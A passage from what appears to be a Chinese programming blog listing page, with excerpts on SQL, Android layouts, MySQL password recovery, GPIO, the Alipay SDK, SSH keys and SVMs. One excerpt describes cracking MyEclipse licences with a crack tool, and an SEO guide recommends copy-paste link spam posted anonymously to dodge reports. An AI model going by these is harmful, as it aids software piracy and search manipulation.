android:textSize="14dp" android:layout_marginLeft="5dp" android:layout_centerVertical="true" android:text="药品" android:layout_alignParentTop="true" android:layout_toRightOf="@+id/imageView30" android:layout_toEndOf="@+id/imageView30"/&gt; &lt;/RelativeLayout&gt; &lt;RelativeLayout android:layout_width="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a1099a80dc17cda3a3fcbc64a648cf4a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa350e4fa1bb448b52c41518a9aa8a27/" rel="bookmark">
			SQL 中条件count()用sum()代替
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2019独角兽企业重金招聘Python工程师标准&gt;&gt;&gt; ------------------------------------------------------------------------------------------------
SELECT
COUNT(
CASE WHEN ${x} &gt; 0 THEN name ELSE NULL end) AS
addCount,
COUNT(
CASE WHEN ${y} &gt; 0 THEN name ELSE NULL end) AS
delCount
FROM
tablename
where...
测试耗时：30min
------------------------------------------------------------------------------------------------
SELECT
SUM(
CASE WHEN ${x} &gt; 0 THEN 1 ELSE 0 end) AS addCount,
SUM(
CASE WHEN ${y} &gt; 0 THEN 1 ELSE 0 end) AS delCount
FROM
tablename
where...
测试耗时8min
------------------------------------------------------------------------------------------------
转载于:https://my.oschina.net/leemoor/blog/651457
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc48e7e0133ec65ed8410fc6d699797d/" rel="bookmark">
			ListView自动滑动到顶部（底部）的方法总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、一个属性 ListView有一个属性叫做stackFromBottom，你可以在xml文件中定义该属性，就像这样子：
android:stackFromBottom="true|false" ListView默认该属性是false。该属性的含义是列表是否从ListView的最底部开始展示，若为true，则从最底部展示，否则从最顶部开始展示。看一下下面的效果就知道是什么意思了。
假设我们定义了一个main.xml：
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent"&gt; &lt;ListView android:id="@+id/listview" android:stackFromBottom="true" android:layout_width="match_parent" android:layout_height="match_parent"&gt; &lt;/ListView&gt; &lt;/RelativeLayout&gt; 其对应的MainActivity.java文件如下：
package com.example.willenhuang.helloworld; import android.support.v7.app.AppCompatActivity; import android.os.Bundle; import android.widget.ArrayAdapter; import android.widget.ListView; import java.util.ArrayList; import java.util.List; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main); ListView listView = (ListView) findViewById(R.id.listview); listView.setStackFromBottom(false); List&lt;String&gt; dataList = new ArrayList&lt;String&gt;(); for (int i = 0; i &lt; 20; i++) { dataList.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc48e7e0133ec65ed8410fc6d699797d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22e71b954126680fe56e22bf567e8545/" rel="bookmark">
			CString 与 TCHAR数组相互转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TCHAR数组转到CString很简单：使用CString的Format就行。
TCHAR m_buf[100] = _T("Hello");
CString str;
str.Format(L"%s",m_buf);
现在就来CString转为TCHAR数组，这个就有点麻烦了。因为网上有很多的解决方案，但是都不怎么理想。
我们使用_tcscpy()宏。
CString str = L"sssssss";
TCHAR m_buf[20];
_tcscpy(m_buf, str);
就好了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a162179ef754931df760a4169a7a79c/" rel="bookmark">
			nysql access denied for user &#34;root&#34;解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mysql出现这种问题的原因是密码出现了问题，但是我不知道为什么出现问题。
解决办法：
具体操作步骤：
关闭mysql:
windows命令行下：
service mysqld stop
mac下
mysql.server stop
然后跳过授权登录mysql。
mysqld_safe --skip-grant-tables
启动mysql:
service mysqld start
mac下 mysql.server start
mysql -u root 输入密码时直接回车。
mysql&gt; use mysql;
mysql&gt; UPDATE user SET Password=PASSWORD('xxx') WHERE user='root';
mysql&gt; flush privileges;
mysql&gt;quit
到这里密码已经修改成功，
mysql -u root -p
需要注意的是，在mysql5.7user 表中已经修改了 password字段修改为 authentication_string。因此以上的修改命令需要修改为
update user set authentication_string = PASSWORD(“XXX”) where user = “root”;
记得要刷新权限。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6774dde8b091f81c5767f0ad27f603a/" rel="bookmark">
			MyEclipse Professional 2014与MyEclipse 2015共存
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 直接上图： 因开发工作需要，原先装有MyEclipse 8.6与MyEclipse Professional 2014 8.6是因为原来老项目的开发环境，2014是一些新项目的工作环境，2个都激活，不存在共存冲突问题。但是装了、激活2015后，2014就显示待激活状态。 解决方案： ①用破解工具（使用说明比较详细）先破解2014；
②按操作步骤成功破解2014后，2015就提示需要激活。还是同样操作，用同样的usercode。注意后面的下拉框，选择你自己对应的2015版本：
③最关键的是这最后一步：选择替换文档时选择2015的plugins目录进行替换
激活成功： 详细操作：MyEclipse2015 Stable2.0安装及破解
也可关注我的微信公众号『TyronToCoder』，一起交流学习。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46380942577d6d3267e35d5a563ba2f0/" rel="bookmark">
			linux gpio export
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux提供了一系列的函数来操作GPIO，看下面的代码：
int io_out, in_in; //定义一个输出ＩＯ和一个输入ＩＯ io_out = GPIO_TO_PIN(1, 16); io_in = GPIO_TO_PIN(1, 17); gpio_request(io_out, "gpio_out");　//申请ＩＯ gpio_request(io_in, "gpio_in"); gpio_direction_output(io_out, 1);　//设置ＩＯ为输出，上拉 gpio_direction_input(io_in);　//设置ＩＯ为输入 gpio_set_value(io_out, 0);　//设置ＩＯ的输出为低 gpio_get_value(io_in);	//读取ＩＯ的值 gpio_export(io_out, 1);	//导出ＩＯ到用户空间 gpio_export(io_in, 0); gpio_export函数的第二个参数表示用户是否可以改变ＩＯ的输入输出方向。 使用gpio_export导出到用户空间后，在/sys/class/gpio/gpio16 和/sys/class/gpio/gpio17提供了访问他们的操作。
例如echo 1 &gt; /sys/class/gpio/gpio16/value即是写入１。
在用户层也可以导出ＩＯ，使用echo 18 &gt; /sys/class/gpio/export即导出IO18到用户空间，再使用 echo in &gt; /sys/class/gpio/gpio18即设置gpio18为输入io，设置输出io调用“echo out。/sys/class/gpio/unexport的操作与export相反，即取消导出的ＩＯ。
gpio的源码在drivers/gpio/Gpiolib.c中，与芯片有关的结构是struct gpio_chip。
用户层也可以将ＩＯ配置为中断，即设置/sys/class/gpio/gpioN/edge：
none表示引脚为输入，不是中断引脚
rising表示引脚为中断输入，上升沿触发
falling表示引脚为中断输入，下降沿触发
both表示引脚为中断输入，边沿触发
首先需要将该gpio配置为中断 echo "rising" &gt; /sys/class/gpio/gpio12/edge 以下是伪代码 int gpio_id; struct pollfd fds[1]; gpio_fd = open("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46380942577d6d3267e35d5a563ba2f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09ecbe094a6fc8a1e67c8568a0727c0b/" rel="bookmark">
			在iOS9上调用支付宝不回调的问题解决，以及支付宝嵌入的流程梳理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		又有一段时间没有经营自己的博客了，这一段有点忙啊！
在最近的一个项目中再一次用到了第三方支付，对，就是支付宝，之前的项目其实已经实现过相应的功能，那是还是在ios8的系统下，这不在iOS9下就遇到了一个问题，不回调啊，反正要梳理支付宝的嵌入，那就先说说具体的流程吧。
我使用的支付宝SDK2.0标准版，下载相应的SDK时，除了会附带支付宝的Demo之外，还有一份文档“移动支付接口SDK2.0标准版接入和使用规则.pdf”，我们大概分3步来总结一下：
第一步：商户签约和秘钥配置；
第二步：SDK集成及xcode相关配置；
第三部：参数设置及相关调试；
接下来我们一步一步来说：
第一步：商户签约和秘要配置；
对于公司的业务一般是由公司申请企业支付宝账号，同时进行签约和相应的业务申请，这是公司该做的，作为开发者给我们的就是一组支付宝账号和密码，我们登录进去可以查看签约管理，示意图如下（注意一下我们进入之后，查看的是支付宝-商家服务，而不是支付宝-开放平台，商家服务可以理解为你为公司的支付宝签约的服务配置信息，而开放平台是给自己作为开发者用的，在开放平台中只能看到在商户服务中配置的信息）
点击查看 商户服务-&gt;签约管理-&gt;查看更多签约信息，之后则需要输入支付宝支付密码才能看见PID和Key等内容（支付宝付费账号是单独设置的，和登录密码不一定相同，试了3遍会被锁定的，最好事先确定一下），之后我们会看到这样一个界面：
这个界面就是我们获取PID和设置秘钥的地方；
接下来就是这个秘钥怎么配的问题了，如上图中所标注的，我们需要添加RSA加密的公钥，作为支付宝的公钥；
在我们下载的SDKDemo中有一个openssl的文件夹，其中包含了windows下的生成秘钥的工具，我是在Mac电脑上操作的，直接在终端上敲命令就行，在根目录下就会生成一组.pem格式的秘钥，一个是私钥，一个是公钥，再用命令生成PKCS8格式的私钥，会直接显示在终端上，保存到一个记事本里保存好，那现在我们手里就有了3个秘钥：
rsa_private_key.pem;
rsa_public_key.pem;
PKCS8编码之后的私钥（字符串）；
其中，PKCS8编码之后的私钥会在app中作为参数privateKey传入，RSA加密的公钥就是前面我们说的要添加作为支付宝公钥的；
好了，第一步就完成了；
第二步：SDK集成及xcode相关配置：
对于继承的流程，文档上有很详尽的描述，一般我的做法就是把Demo中给的这几个文件拖进应用：
这个order类也是从Demo中拷出来的；
在导入SDK之后，还需要在Header Search Paths增加头文件路径，引入支持的系统库，Info-UIL Types中增加URL Schemes，同时还要进行ios9的适配，在Info plist文件中增加LSApplicationQueriesSchemes数组属性，增加两个值：alipay和alipayshare...反正就是正常做就行了；
这里完成了上述的步骤之后，run一下，发现竟然跑不了，报错了（是不是很郁闷！）
Undefined symbols for architecture armv7: "_OBJC_CLASS_$_UTDevice", referenced from: objc-class-ref in AlipaySDK ld: symbol(s) not found for architecture armv7 clang: error: linker command failed with exit code 1 (use -v to see invocation)具体解决过程就不提了，在链接的系统库中增加CoreMotion.framework就好了。 这下可以编译通过了，第二步也完成了；
第三部：参数设置及相关调试：
按照Demo中的请求调用支付宝支付，我们需要若干参数：
partner:合作身份者ID，以2088开头，也就是前面我们提到的PID；
seller:商家的支付宝收款账号；
privateKey:还记得那个PKCS8格式的秘钥吗，对，就是他；
order.tradeNO:这个订单内容编码是最终要传给服务端的，其中根据不同的业务需求可能会传订单Id，用户Id，优惠券Id等信息，支付宝回调服务端之后，进行入库；
order.productName:可以作为产品业务名；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/09ecbe094a6fc8a1e67c8568a0727c0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b26be030d4b5490611850bb7faac14c3/" rel="bookmark">
			LayoutInflater.inflate的用法总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LayoutInflater.inflate的用法总结 1、inflate是Android开发中经常使用到的将布局作为一个view而引进的一个方法。我们知道inflate具有两个可以使用重载方法，他们的方法签名分别是：
inflate(int resource, ViewGroup root) inflate(int resource, ViewGroup root, boolean attachToRoot) 第一个参数指向的是你想要引进的布局资源ID。第二个参数表示该布局的大小限制在root这个Viewgroup中。第三个参数则表示是否将root作为该布局的Viewgroup。true表示该布局是附着在root中的，false表示该布局不附着在root中。
2、在Android开发当中，我们经常使用如下的方法引进一个布局：
inflate(resource, null); 虽然这样做在很多情况下都没什么错误，但是还是有一些情况，如果将null作为第二个参数传递过去，会导致一些意想不到的情况发生。我们通过一个实际的例子来说明。
适配器Adapter是最常见的使用inflate的例子。那么我们看看下面的代码，先预估一下它会产生什么样的效果。
item_row.xml:
&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="100dp" android:gravity="center_vertical" android:orientation="horizontal"&gt; &lt;TextView android:id="@+id/text1" android:layout_width="wrap_content" android:layout_height="wrap_content" android:paddingRight="15dp" android:text="Text1" /&gt; &lt;/LinearLayout&gt; main.xml:
&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent"&gt; &lt;ListView android:id="@+id/listview" android:layout_width="match_parent" android:layout_height="wrap_content" /&gt; &lt;/RelativeLayout&gt; MainActivity.java:
package com.example.runningh.myapplication; import android.support.v7.app.AppCompatActivity; import android.os.Bundle; import android.view.Menu; import android.view.MenuItem; import android.view.View; import android.view.ViewGroup; import android.widget.BaseAdapter; import android.widget.ListView; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b26be030d4b5490611850bb7faac14c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/700f7e636ad83fb11c3af3ce57cdd68f/" rel="bookmark">
			sqlite3_get_table()
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		函数sqlite3_get_table()返回单独函数调用中一个命令的整个结果集。
sqlite3_get_table()函数声明如下：
int sqlite3_get_table(sqlite3 *db,	//打开的数据库的句柄const char *zSql,	//要执行的SQL语句char ***pazResult,	//结果写入该指针指向的char***int *pnRow,	//结果集中行的数目int *pnColumn,	//结果集中列的数目char **pzErrmsg	//错误信息); 此函数接受sql中的SQL语句返回的所有记录，使用堆上声明的内存（使用sqlite3_malloc()）将所有记录存储在参数char*** pazResult中。必须使用sqlite3_table_free()函数释放内存
该函数将char ***pazResult指针作为唯一的参数。pazResult中的第一个记录其实并不是记录，而且结果集中列的名称。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a148cc3e70c11c283d2b30762283301d/" rel="bookmark">
			MySQL进行sum运算之后如何保留两位小数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2019独角兽企业重金招聘Python工程师标准&gt;&gt;&gt; SELECT cast(sum(column_a+column_b) AS decimal(15,2)) FROM `tabname` 转载于:https://my.oschina.net/u/940075/blog/648377
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e6d3dd523f173243c94253a1dde8c6a/" rel="bookmark">
			网站发布外联的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2019独角兽企业重金招聘Python工程师标准&gt;&gt;&gt; 13种外链做法全攻略
久违的“长篇大论”又来了，这次针对外链的做法写了一篇详细的攻略，帮
助新手朋友快速上手外链，seo高手也许能在其中拓展一下思路。
1.博客
在“新浪”、“和讯”、“网易”、“天涯”等博客上发布文章，在文章中
加入网站域名或者加入网站主关键词锚文本链接到网站。博客的收录还是比较快
的，文章标题可以为网站的长尾关键词，数量上去后也可以为网站带来不错的流
量。
内容不必刻意追求质量，可以随意复制粘贴，只要文章中做好网站的锚链接
即可。网上的一些博客群发软件，比如石青博客群发等比较难用，成功率也低，
推荐自己动手发送，一天做10几条对于一个小型网站已经足够，把这些博客平台
放到一个收藏夹中，一天也就是花个半小时左右。
2.问答平台
在“百度知道”、“好搜问答”、“天涯问答”等问答平台中回答问题，并
以图片或者诱导的方式吸引流量。
比如在百度知道中回答可以加入网址图片，也可以是QQ或者其他形式，注意
匿名，防止被举报，一天1-2条即可。也可以以文字形式“可以百度xx网站”或者
直接加入链接，同样一天最多2条。
3.论坛博客留言
就目前来讲，签名链接或者带链接的垃圾回复已经过时，花些时间回复写言
之有物的文字更有意义。就长远来讲，通过有价值的评论引起博主注意，潜在外
部链接价值比任何形式的留言都高得多。
比如我经常关注在论坛发布帖子中的留言，100个回复中95个都是无意义的回
复，当有一两个认真看完帖子并发表自己见解的回复时很容易就能引起注意，这
时候再留下自己网站名称，或许就可以交到朋友或者一起合作个项目什么的，至
少我在论坛中看到比较好的帖子时都会用心回复。
4.线下外链
这里的“线下外链”指的是通过线下的人际关系、生意伙伴等社交圈子内的
朋友获得网站外链，在现实社会中人与人之间的信任感要比网络上强的多，而且
非seo行业内的人对于“外链”也没有那么敏感。一个高质量外链也许就是一顿饭
几句话的事情，几杯黄汤下了肚，什么都好说，哈哈。
5.网摘
通过“百度搜藏”、“QQ书签”等网摘书签做外链，关于这点没什么好说的
，做就是了，不过有点过时的感觉，吸引流量的效果也大不如从前。
6.百科
在百科“扩展阅读”中加入网站链接这种外链方式推荐度不高，投入与产出
完全不成正比，现在百度百科审查太严格了，有兴趣的朋友可以挑战一下。
7.大神博客
现在很多业内大神的博客都接受投稿，这类博客的流量和访客质量都非常的
高，比如seo中的“卢松松博客”，点击量非常不错，投稿成功的文章尾部可以加
入网站链接，相信引流效果会非常好。可以试着在这些博客上投稿，要是能和这
些大神做个朋友就更好了。
8.检查竞争对手网站
竞争对手网站链接来源是个取之不尽的宝藏，强烈建议SEO人员用站长工具检
查主要竞争对手外链情况，看看竞争对手有哪些外链？为什么人家会给予外链？
是交换还是链接诱饵？还是新闻或者购买的链接？你能不能说服这些网站也给你
一个链接？既然他们能给竞争对手链接，你能成功获得链接的可能性也不会小。
强有力的竞争对手可能有成千上万的外部链接，闲着没事的时候可以把竞争
对手的网站外链过一遍，一定能发现号的来源。
9.网站广告
网上有很多网站，尤其是信息类和个人网站，有不错的内容和流量，却整天
发愁怎么赢利。主动联系这些没有清晰赢利模式的网站投放广告，有时能拿到非
常便宜的价格，几十、几百块一个月，也许就能在一个流量不错的论坛或信息网
站获得全站链接。要找到这种网站也相对容易，只要搜索相关关键词，那些没有
出售自己的产品，大量出现联盟广告的网站，都是不错的备选广告目标。
10.cms模板
网上有大量免费开源CMS系统，很多小型网站或者个人博客建站都是使用这类
现成的cms系统，比图wordpress、dedecms等。使用这类cms系统的网站非常多，
模板（主题）的需求量也非常的大，熟悉这类CMS系统模板制作的站长可以设计不
同风格的模板，供其他站长免费试用，唯一的条件就是在模板版权声明处留下设
计者的链接。
这种方法是建设外链非常非常有效的方式，往往能带来大量的链接，而且是
单向链接哦。需要注意的是，这些链接通常是全站链接，是搜索引擎比较敏感的
链接种类，建议锚文字不要过于商业化，使用网站名称即可。
11.新闻源发布
这几天百度又开始打击新闻源站点了，不过就目前来讲，影响不大。对于小
型站长来说，十几块一篇的新闻源配合高质量的软文，是一种经济高效的推广方
式，值得一试。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e6d3dd523f173243c94253a1dde8c6a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa0b9da313580fd72ae1b2d813c65702/" rel="bookmark">
			APP隐私政策
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 隐私政策 本应用尊重并保护所有使用服务用户的个人隐私权。为了给您提供更准确、更有个性化的服务，本应用会按照本隐私权政策的规定使用和披露您的个人信息。但本应用将以高度的勤勉、审慎义务对待这些信息。除本隐私权政策另有规定外，在未征得您事先许可的情况下，本应用不会将这些信息对外披露或向第三方提供。本应用会不时更新本隐私权政策。 您在同意本应用服务使用协议之时，即视为您已经同意本隐私权政策全部内容。本隐私权政策属于本应用服务使用协议不可分割的一部分。 1. 适用范围 (a) 在您注册本应用帐号时，您根据本应用要求提供的个人注册信息；
(b) 在您使用本应用网络服务，或访问本应用平台网页时，本应用自动接收并记录的您的浏览器和计算机上的信息，包括但不限于您的IP地址、浏览器的类型、使用的语言、访问日期和时间、软硬件特征信息及您需求的网页记录等数据；
(c) 本应用通过合法途径从商业伙伴处取得的用户个人数据。
您了解并同意，以下信息不适用本隐私权政策：
(a) 您在使用本应用平台提供的搜索服务时输入的关键字信息；
(b) 本应用收集到的您在本应用发布的有关信息数据，包括但不限于参与活动、成交信息及评价详情；
(c) 违反法律规定或违反本应用规则行为及本应用已对您采取的措施。 2. 信息使用 (a)本应用不会向任何无关第三方提供、出售、出租、分享或交易您的个人信息，除非事先得到您的许可，或该第三方和本应用（含本应用关联公司）单独或共同为您提供服务，且在该服务结束后，其将被禁止访问包括其以前能够访问的所有这些资料。
(b) 本应用亦不允许任何第三方以任何手段收集、编辑、出售或者无偿传播您的个人信息。任何本应用平台用户如从事上述活动，一经发现，本应用有权立即终止与该用户的服务协议。
(c) 为服务用户的目的，本应用可能通过使用您的个人信息，向您提供您感兴趣的信息，包括但不限于向您发出产品和服务信息，或者与本应用合作伙伴共享信息以便他们向您发送有关其产品和服务的信息（后者需要您的事先同意）。 3. 信息披露 在如下情况下，本应用将依据您的个人意愿或法律的规定全部或部分的披露您的个人信息：
(a) 经您事先同意，向第三方披露；
(b)为提供您所要求的产品和服务，而必须和第三方分享您的个人信息；
(c) 根据法律的有关规定，或者行政或司法机构的要求，向第三方或者行政、司法机构披露；
(d) 如您出现违反中国有关法律、法规或者本应用服务协议或相关规则的情况，需要向第三方披露；
(e) 如您是适格的知识产权投诉人并已提起投诉，应被投诉人要求，向被投诉人披露，以便双方处理可能的权利纠纷；
(f) 在本应用平台上创建的某一交易中，如交易任何一方履行或部分履行了交易义务并提出信息披露请求的，本应用有权决定向该用户提供其交易对方的联络方式等必要信息，以促成交易的完成或纠纷的解决。
(g) 其它本应用根据法律、法规或者网站政策认为合适的披露。 4. 信息存储和交换 本应用收集的有关您的信息和资料将保存在本应用及（或）其关联公司的服务器上，这些信息和资料可能传送至您所在国家、地区或本应用收集信息和资料所在地的境外并在境外被访问、存储和展示。 5. Cookie的使用 (a) 在您未拒绝接受cookies的情况下，本应用会在您的计算机上设定或取用cookies ，以便您能登录或使用依赖于cookies的本应用平台服务或功能。本应用使用cookies可为您提供更加周到的个性化服务，包括推广服务。
(b) 您有权选择接受或拒绝接受cookies。您可以通过修改浏览器设置的方式拒绝接受cookies。但如果您选择拒绝接受cookies，则您可能无法登录或使用依赖于cookies的本应用网络服务或功能。
(c) 通过本应用所设cookies所取得的有关信息，将适用本政策。 6. 信息安全 (a) 本应用帐号均有安全保护功能，请妥善保管您的用户名及密码信息。本应用将通过对用户密码进行加密等安全措施确保您的信息不丢失，不被滥用和变造。尽管有前述安全措施，但同时也请您注意在信息网络上不存在“完善的安全措施”。
(b) 在使用本应用网络服务进行网上交易时，您不可避免的要向交易对方或潜在的交易对 7.本隐私政策的更改 (a)如果决定更改隐私政策，我们会在本政策中、本公司网站中以及我们认为适当的位置发布这些更改，以便您了解我们如何收集、使用您的个人信息，哪些人可以访问这些信息，以及在什么情况下我们会透露这些信息。
(b)本公司保留随时修改本政策的权利，因此请经常查看。如对本政策作出重大更改，本公司会通过网站通知的形式告知。 方披露自己的个人信息，如联络方式或者邮政地址。请您妥善保护自己的个人信息，仅在必要的情形下向他人提供。如您发现自己的个人信息泄密，尤其是本应用用户名及密码发生泄露，请您立即联络本应用客服，以便本应用采取相应措施。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d621ae1c84e79a06ce0e1f0d045f374/" rel="bookmark">
			hdu 4267 线段树间隔更新
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		A Simple Problem with Integers Time Limit: 5000/1500 MS (Java/Others) Memory Limit: 32768/32768 K (Java/Others)
Total Submission(s): 4996 Accepted Submission(s): 1576
Problem Description Let A1, A2, ... , AN be N elements. You need to deal with two kinds of operations. One type of operation is to add a given number to a few numbers in a given interval. The other is to query the value of some element. Input There are a lot of test cases.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5d621ae1c84e79a06ce0e1f0d045f374/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71bc57fe62318a1321118c904ef50d86/" rel="bookmark">
			使用ssh-keygen和ssh-copy-id三步实现SSH无密码登录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文转自：http://blog.chinaunix.net/uid-26284395-id-2949145.html
ssh-keygen 产生公钥与私钥对.
ssh-copy-id 将本机的公钥复制到远程机器的authorized_keys文件中，ssh-copy-id也能让你有到远程机器的home, ~./ssh , 和 ~/.ssh/authorized_keys的权利 第一步:在本地机器上使用ssh-keygen产生公钥私钥对 jsmith@local-host$ [Note: You are on local-host here] jsmith@local-host$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/jsmith/.ssh/id_rsa):[Enter key] Enter passphrase (empty for no passphrase): [Press enter key] Enter same passphrase again: [Pess enter key] Your identification has been saved in /home/jsmith/.ssh/id_rsa. Your public key has been saved in /home/jsmith/.ssh/id_rsa.pub. The key fingerprint is: 33:b3:fe:af:95:95:18:11:31:d5:de:96:2f:f2:35:f9 jsmith@local-host 第二步:用ssh-copy-id将公钥复制到远程机器中 jsmith@local-host$ ssh-copy-id -i ~/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/71bc57fe62318a1321118c904ef50d86/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2dfb067740875966c02b413fb34e38f/" rel="bookmark">
			理解支持向量机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 支持向量机是一个二类分类模型，但也可以扩展为多类分类。其基于间隔最大化和核技巧的特点可以使它可以灵活处理线性或非线性分类问题。 支持向量机可是形式化为一个凸二次规划问题，学习算法是求解基于凸二次规划的最优化算法。 按照训练数据是否线性可分，支持向量机可以分为基于硬间隔的线性可分支持向量机、基于软间隔的线性支持向量机、基于核技巧和软间隔最大化的非线性支持向量机。三者复杂性是依次增加的。 1、基于硬间隔最大化的线性可分支持向量机 我们知道，感知机和决策树等学习方法没有区分模型的输入空间和特征空间，即认为两者所处的空间是一样的。支持向量机的输入空间和特征空间是不同的，输入空间为欧氏空间或离散集合，特征空间是希尔伯特空间。希尔伯特空间可以看作是欧氏空间的扩展，其空间维度可以是任意维的，包括无穷维。并且一个重要的性质是其具有欧氏空间不具备的完备性。这些特点都是支持向量机在做非线性特征空间映射所需要的。 下面从最简单的线性可分支持向量机入手，学过感知机的都知道，感知机通过训练一个超平面将平面或空间线性可分的点进行划分。 其超平面方程为 w∙x+b=0； 分类决策函数f(x)=sign(w∙x+b)。 线性可分支持向量机也是如此，通过找寻分割平面来划分数据集。不同的是，感知机的学习策略是误分类点到超平面距离和最小化，而线性可分支持向量机是基于硬间隔最大化的。
何为硬间隔最大化？ 我们知道，当参数w,b确定后，其分类超平面也就确定了，那么分类超平面两侧的点到超平面的距离就可以得出， 这些点到分类超平面中必然有一个最小距离，实际上可划分这两组点的超平面的参数w,b有很多组，同样对应有最小距离。w,b选取什么值时，分类效果最好呢？就是分类面到两侧的距离越远说明分类效果越好，即找出这组最小距离中的最大值。为了度量这个值，这里引出了函数间隔和几何间隔的概念。 在超平面确定的情况下，能够相对表示点x距离超平面的远近，可以理解为对超平面进行上下移动。 而的符号与类标记符号是否一致能够表示分类是否正确。 函数间隔：对于给定的训练数据集T和超平面(w,b)，定义超平面（w,b）关于样本点的函数间隔为： 定义: 为超平面（w,b）对所有样本点函数距离最小值。 但是函数间隔存在一个问题，就是如果我们成比例地改变w,b的值，那么函数间隔的值就是变为原来的两倍，而超平面却并没有改变。为了解决这个问题，定义了几何间隔： 对于给定的训练数据集T和超平面（w,b），定义超平面关于样本点 的几何间隔为： 定义: 为超平面（w,b）对所有样本点几何间隔最小值。 其中||w||为w的L2范数，通过除以法向量的范数来对距离进行约束,保证了如果w,b成比例变化时，点到超平面的几何间隔不变。 从函数间隔和几何间隔的定义可以看出： 这里我们回到硬间隔最大化。为了使分类效果最好，我们要求这个最小间隔值最大，即求使下列目标函数和约束条件成立的w,b值 , 即： 我们知道， 函数间隔 ̂随着w,b成比例的变化而成同比例的变化，即若w,b同时变为原来的两倍，则函数间隔也为原来的两倍，故当w,b成比例变化时，目标函数不变，约束条件也不变。也就是说 取值并不影响目标函数和约束条件，不影响整个问题的 求解，因此为了接下来的计算方便，我们取 =1，从而目标函数可以写为： 因为求 的最大等价于求||w||的最小，也就等价于求 的最小，从而将问题改写为： 为什么要将 的最大等价求 的最小，是因为要将目标函数转换为一个凸二次规划问题，从而满足后面求对偶问题需要的KKT条件，而且使所求的解为全局最优解。系数加个1/2是为了求导的时候约去系数，计算方便。 现在的问题就是如何求解在有不等式约束条件下的函数最优。我们可以使用拉格朗日乘子法来求解，定义拉格朗日函数的形式如下： 由上式可知，因为h(x)=0, g(x)≤0，在满足约束条件下的 L(x,α，β)必然小于等于f(x)，且max L(x,α，β)=f(x)。 为每个约束条件引入一个拉格朗日乘子 ≥0，且根据拉格朗日乘子法的形式将约束条件添加负号转化为小于等于，定义拉格朗日函数： 这样问题就变成了求 一般来说，这样的形式不太容易求解，我们可以转为求其对偶问题 的解。 原始问题与对偶问题存在相同的最优解，要求原始问题满足KKT条件。所谓KKT条件就是： 1. L(w,b,α)对x求导为零； 2. h(x) =0; 3. α∙g(x) = 0; 这时我们之前构造的凸二次规划问题就派上用场了，可以证明其存在对偶问题，且对偶问题最优值与原始问题最优值相同。 转换为对偶问题后，求解过程如下： 